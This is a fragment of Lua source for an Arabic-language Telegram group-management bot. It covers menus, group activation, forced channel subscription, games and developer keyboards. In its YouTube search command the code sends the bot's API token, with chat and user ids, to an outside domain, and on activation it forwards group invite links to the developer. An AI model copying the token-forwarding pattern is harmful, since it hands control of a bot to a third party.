if not Addictive(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص للادمنية فقط')
return false
end
local Text =[[*
✦┇توجد ↜ 6 اوامر في البوت
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇ارسل { م1 } ↜ اوامر الحمايه
✦┇ارسل { م2 } ↜ اوامر الادمنيه
✦┇ارسل { م3 } ↜ اوامر المدراء
✦┇ارسل { م4 } ↜ اوامر المنشئين
✦┇ارسل { م5 } ↜ اوامر مطورين البوت
✦┇ارسل { م6 } ↜ اوامر الاعضاء
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❸ •', callback_data=msg.sender_user_id_.."/help3"},{text = '• ❷ •', callback_data=msg.sender_user_id_.."/help2"},{text = '• ❶ •', callback_data=msg.sender_user_id_.."/help1"},
},
{
{text = '• ❻ •', callback_data=msg.sender_user_id_.."/Services"},{text = '• ❺ •', callback_data=msg.sender_user_id_.."/help5"},{text = '• ❹ •', callback_data=msg.sender_user_id_.."/help4"},
},
{
{text = '{اعدادات المجموعة}', callback_data=msg.sender_user_id_.."/helps"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'اوامر الرتب' then  
local Text =[[*
✦┇اهلا بك في قائمة اوامر الرتب
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇يمكنك مسح رتب المجموعة من خلال الازرار في الاسفل
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح المميزين', callback_data=msg.sender_user_id_.."/delvips"},{text = 'مسح الادمنية', callback_data=msg.sender_user_id_.."/deladmin"},
},
{
{text = 'مسح المدراء', callback_data=msg.sender_user_id_.."/delmoder"},{text = 'مسح المنشئين', callback_data=msg.sender_user_id_.."/delmnsh"},
},
{
{text = 'مسح المنشئين الاساسيين', callback_data=msg.sender_user_id_.."/delassaseen"},{text = 'مسح المالكين', callback_data=msg.sender_user_id_.."/deldelcreatorr"},
},
{
{text = 'مسح المكتومين', callback_data=msg.sender_user_id_.."/delktm"},{text = 'مسح المحظورين', callback_data=msg.sender_user_id_.."/delban"},
},
{
{text = 'مسح الاوامر المضافه', callback_data=msg.sender_user_id_.."/delCmdd"},{text = 'مسح المنظفين', callback_data=msg.sender_user_id_.."/delcleanerr"},
},
{
{text = 'اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "م1" or text == "م2" or text == "م3" or text == "م4" or text == "م5" or text == "م6" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*\n✦┇عذࢪاَ يڪلبي\n✦┇عليڪ الاشتࢪاڪ في قناه البوت\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Text =[[*
✦┇عليك استخدام اوامر التحكم بالقوائم 
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '{ قائمة الاوامر }', callback_data=msg.sender_user_id_.."/help"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

end ---- Chat_Type = 'GroupBot' 
end ---- Chat_Type = 'GroupBot' 

if text == 'تفعيل' and DevBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*\n✦┇عذࢪاَ يڪلبي\n✦┇عليڪ الاشتࢪاڪ في قناه البوت\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✦┇البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Neverland:Num:Add:Bot') or 0) and not DevNeverland(msg) then
send(msg.chat_id_, msg.id_,'✦┇عدد اعضاء المجموعه اقل من *~ {'..(database:get(bot_id..'Neverland:Num:Add:Bot') or 0)..'* عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'\n*✦┇المجموعة : {'..chat.title_..'}*\n*✦┇تم تفعيلها مسبقا*')
else
local Text = '\n*✦┇المجموعة : {'..chat.title_..'}*\n*✦┇تم تفعيلها بنجاح*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- رفع المالك والادمنية',callback_data="/addadmin@"..msg.chat_id_..':'..msg.sender_user_id_},
},
{
{text = '- قفل جميع الاوامر',callback_data="/locall@"..msg.chat_id_..':'..msg.sender_user_id_},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
database:sadd(bot_id.."creator"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '• تم تفعيل مجموعه جديده'..
'\n✦┇بواسطة ~ '..Name..''..
'\n✦┇ايدي المجموعه ~ `'..IdChat..'`'..
'\n✦┇عدد اعضاء المجموعه *~ '..NumMember..'*'..
'\n✦┇اسم المجموعه ~ ['..NameChat..']'..
'\n✦┇الرابط ~ ['..LinkGp..']'
if not DevNeverland(msg) then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مغادرة البوت',callback_data="/leftbot@"..IdChat},
},
{
{text = URL.escape(NameChat),url=LinkGp},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. Id_Sudo .. '&text=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and DevBot(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيلها مسبقا >* {'..chat.title_..'}')
else
Reply_Status(msg,result.id_,'reply_Add','*✦┇تم تعطيل المجموعه >* {'..chat.title_..'}')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '• تم تعطيل مجموعه جديده\n'..
'\n✦┇بواسطة ~ '..Name..''..
'\n✦┇ايدي المجموعه ~ `'..IdChat..'`'..
'\n✦┇اسم المجموعه ~ ['..NameChat..']'..
'\n✦┇الرابط ~ ['..LinkGp..']'
if not DevNeverland(msg) then
sendText(Id_Sudo,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not DevBot(msg) and not database:get(bot_id..'Neverland:Free:Add:Bots') then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*\n✦┇عذࢪاَ يڪلبي\n✦┇عليڪ الاشتࢪاڪ في قناه البوت\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✦┇البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'الادمن'
else 
var= 'عضو'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'\n*✦┇المجموعة : {'..chat.title_..'}*\n*✦┇تم تفعيلها مسبقا*')
end
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Neverland:Num:Add:Bot') or 0) and not DevNeverland(msg) then
send(msg.chat_id_, msg.id_,'✦┇عدد اعضاء المجموعه اقل من *~ {'..(database:get(bot_id..'Neverland:Num:Add:Bot') or 0)..'* عضو')
else
local Text = '\n*✦┇المجموعة : {'..chat.title_..'}*\n*✦┇تم تفعيلها بنجاح*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- رفع المالك والادمنية',callback_data="/addadmin@"..msg.chat_id_..':'..msg.sender_user_id_},
},
{
{text = '- قفل جميع الاوامر',callback_data="/locall@"..msg.chat_id_..':'..msg.sender_user_id_},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
database:sadd(bot_id.."creator"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '• تم تفعيل مجموعه جديده'..
'\n✦┇من قام بتفعيلها ~ '..Name..''..
'\n✦┇ايدي المجموعه ~ `'..IdChat..'`'..
'\n✦┇عدد اعضاء المجموعه *~ '..NumMember..'*'..
'\n✦┇اسم المجموعه ~ ['..NameChat..']'..
'\n✦┇الرابط ~ ['..LinkGp..']'
if not DevNeverland(msg) then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مغادرة البوت',callback_data="/leftbot@"..IdChat},
},
{
{text = URL.escape(NameChat),url=LinkGp},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. Id_Sudo .. '&text=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if text == "نسبة الحب" or text == "نسبه حب" then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = '✦┇الان ارسل اسمك واسم الشخص الثاني :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","?? 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبة الحب بيـن : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnum..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == 'كيبورد اوامر الاذاعة ↞' then  
if DevNeverland(msg) then
local Text = '*✦┇مرحبا بك في كيبورد اوامر الاذاعة*'
local keyboard = {
{'اذاعه خاص ↞','المطورين ↞','اذاعه ↞'},
{'تفعيل الاذاعه ↞','تعطيل الاذاعه ↞'},
{'اذاعه بالتوجيه ↞','اذاعه بالتوجيه خاص ↞'},
{'رجوع 🔚'},
}
send_inline_key(msg.chat_id_,Text,keyboard)
return false
end end
if text == 'كيبورد الاشتراك الاجباري ↞' then  
if DevNeverland(msg) then
local Text = '*✦┇مرحبا بك في كيبورد اوامر الاشتراك*'
local keyboard = {
{'تفعيل الاشتراك الاجباري ↞','تعطيل الاشتراك الاجباري ↞'},
{'تغير رساله الاشتراك ↞','حذف رساله الاشتراك ↞'},
{'تعين قناة الاشتراك ↞','تغير الاشتراك ↞'},
{'الاشتراك الاجباري ↞'},
{'رجوع 🔚'},
}
send_inline_key(msg.chat_id_,Text,keyboard)
return false
end end
if Chat_Type == 'UserBot' then
if text == '/start' or text == 'رجوع 🔚' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if DevNeverland(msg) then
local Text = '*✦┇اهلا بك عزيزي .*\n*✦┇في لوحه الاوامر ألخاصه بالمطور الاساسي .*'
local keyboard = {
{'تغيير المطور الاساسي ↞','قناه تحديثات السورس ↞'},
{'المطور ↞'},
{'تغير اسم البوت ↞','الاحصائيات ↞'},
{'تعطيل التواصل ↞','تفعيل التواصل ↞'},
{'مسح قائمه العام ↞','قائمة العام ↞','مسح المطورين ↞'},
{'الثانويين ↞','مسح الثانويين ↞'},
{'تنظيف الكروبات ↞','تنظيف المشتركين ↞'},
{'كيبورد اوامر الاذاعة ↞'},
{'تفعيل المغادره ↞','تعطيل المغادره ↞'},
{'تفعيل البوت الخدمي ↞','تعطيل البوت الخدمي ↞'},
{'حذف كليشه ستارت ↞','ضع كليشه ستارت ↞'},
{'كيبورد الاشتراك الاجباري ↞'},
{'المتجر ↞','الاوامر الخدمية ↞'},
{'تحديث السورس ↞','تحديث ↞'},
{'لاصدار ↞','معلومات السيرفر ↞'},
{'نسخه احتياطيه ↞','رفع نسخه احتياطيه ↞'},
{'تفعيل النسخه التلقائيه ↞','تعطيل النسخه التلقائيه ↞'},
{'اعادة التشغيل ↞'},
{'الغاء ↞'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
else
if not database:get(bot_id..'Neverland:Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
Test = start
else
Texti = "\n*✦┇أهلآ بك في بوت "..Namebot.." *\n*✦┇اختصاص البوت حماية المجموعات*\n*✦┇لتفعيل البوت عليك اتباع مايلي*\n*✦┇اضف البوت الى مجموعتك*\n*✦┇ارفعه ادمن {مشرف}*\n*✦┇ارسل كلمة { تفعيل } ليتم تفعيل المجموعه*\n*✦┇سيتم ترقيتك منشئ اساسي في البوت*\n*✦┇للعب داخل البوت ارسل  : /play .*\n*✦┇مطور البوت ↜ {"..UserName.."}*"
keyboard = {} 
keyboard.inline_keyboard ={{{text = "اضفني", switch_inline_query="للتفعيل ارفعني مشرف وارسل تفعيل في المجموعه ."}}}
local msg_id = msg.id_/2097152/0.5
local res = https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
database:setex(bot_id..'Neverland:Start:Time'..msg.sender_user_id_,60,true)
return false
end
if text == 'تفعيل النسخه التلقائيه ↞' and VIP_DeV(msg) then  
send(msg.chat_id_, msg.id_,"*✦┇تم تفعيل النسخه الاحتياطيه التلقائيه*") 
database:del(bot_id.."AutoFile")
end
if text == 'تعطيل النسخه التلقائيه ↞' and VIP_DeV(msg) then  
send(msg.chat_id_, msg.id_,"*✦┇تم تعطيل النسخه الاحتياطيه التلقائيه*") 
database:set(bot_id.."AutoFile",true) 
end
if text and text:match("^برج (.*)$") then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://black-source.tk/BlackTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_, br.ok.hso)
end
if text and text:match('^بحث (.*)$') then            
local Ttext = text:match('^بحث (.*)$') 
local msgin = msg.id_/2097152/0.5 
https.request('https://evzxar.ml/Youtube/B333BB.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin..'&user='..msg.sender_user_id_)
end
if text == 'المتجر' or text == 'المتجر ↞' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Text = '*✦┇اهلا بك مجددا عزيزي المطور \n✦┇اليك الازرار الخاصه بمتجر سورس نيفرلاند فقط اضغط على الامر الذي تريد تنفيذه*'
local keyboard = {
{'متجر الملفات ↞'},
{'الملفات ↞','مسح جميع الملفات ↞'},
{'تفعيل ملف MutedName.lua','تعطيل ملف MutedName.lua'},
{'تفعيل ملف TwhName.lua','تعطيل ملف TwhName.lua'},
{'تفعيل ملف SharGroup.lua','تعطيل ملف SharGroup.lua'},
{'تفعيل ملف TagAdmin.lua','تعطيل ملف TagAdmin.lua'},
{'تفعيل ملف ChengName.lua','تعطيل ملف ChengName.lua'},
{'تفعيل ملف ChengUser.lua','تعطيل ملف ChengUser.lua'},
{'تفعيل ملف SehUser.lua','تعطيل ملف SehUser.lua'},
{'تفعيل ملف ReplyBot.lua','تعطيل ملف ReplyBot.lua'},
{'تفعيل ملف ChengPhoto.lua','تعطيل ملف ChengPhoto.lua'},
{'تفعيل ملف AddedMe.lua','تعطيل ملف AddedMe.lua'},
{'رجوع 🔚'},
}
send_inline_key(msg.chat_id_,Text,keyboard)
return false
end
if text == '/play' or text == 'الاوامر الخدمية ↞' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Text = '*✦┇اهلا بك مجددا عزيزي المطور \n✦┇اليك الازرار الخاصه بأوامر الخدمية لسورس نيفرلاند فقط اضغط على الامر الذي تريد تنفيذه*'
local keyboard = {
{'الابراج ↞'},
{'اليوتيوب ↞'},
{'نسبة الخيانة','نسبة الزحف'},
{'نسبة الكره','نسبة الرجوله','نسبة الحب'},
{'نسبة الرجوله','نسبة الحب'},
{'نسبة الغباء','كشف الحيوان','كشف الارتباط'},
{'رموز مزخرفة 🏷️','ارقام جاهزة 🔢'},
{'قناة السورس 📡 .'},
{'رجوع 🔚'},
}
send_inline_key(msg.chat_id_,Text,keyboard)
return false
end
if text == 'الابراج' or text == 'الابراج ↞' then
local Text = '*مرحبا بك عزيزي في قائمة الابراج اختر برجك الان !*'
local keyboard = {
{'برج العقرب','برج الثور'},
{'برج العذراء','برج القوس'},
{'برج الجوزاء','برج الحوت'},
{'برج الميزان','برج الحمل'},
{'برج الاسد','برج السرطان'},
{'برج الدلو','برج العذراء'},
{'رجوع 🔚'},
}
send_inline_key(msg.chat_id_,Text,keyboard)
return false
end
if text == 'اليوتيوب ↞' then
Text = [[*
✦┇اهلا بك في يوتيوب البوت 
✦┇طريقة البحث 
✦┇بحث + اسم الاغنية او المطرب*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Neverland Team',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/TEAM_Neverland&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'قناة السورس 📡 .' then
Text = [[*
✦┇Welcome to Source
✦┇TeAm - ”Neverland”
 ┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Neverland Team',url="https://t.me/TEAM_Neverland"},
},
{
{text = '𝗯𝗼𝘁 𝘁𝘄𝗶𝘀𝗹',url="t.me/B333BBBOT"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/TEAM_Neverland&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'رموز مزخرفة 🏷️' then
Text = [[
 ۞ ۩ ✟ 『  』۝ Ξ 道 凸 父 个 ¤ 品 〠 ๛ 𖤍 ᶠᶸᶜᵏᵧₒᵤ ࿐ ⍆ ⍅ ⇭ ༒   𖠃 𖠅 𖠆 𖠊 𖡒 𖡗 𖣩 ꧁ ꧂  〰 𖥓 𖥏 𖥎 𖥌 𖥋 𖥊 ?? 𖥅 𖥃 ?? 𖥀 𖤼 𖤹 𖤸 𖤷 𖤶 𖤭 𖤫 𖤪 𖤨 𖤧 𖤥 𖤤 ?? 𖤢 𖤡 𖤟 𖤞 ?? ?? 𖤛 𖤚 𖤘 𖤙 𖤗 𖤕 𖤓 𖤒 𖤐 ဏ ࿘ ࿗ ࿖ ࿕ ࿑ ࿌ ࿋ ࿊ ࿉ ࿈ ࿇ ࿅ ࿄ ࿃ ࿂ ༼ ༽ ༺ ༻ ༗ ༖ ༕ ⏝ ⏜ ⏎ ၄ ߷ ܛ ׀
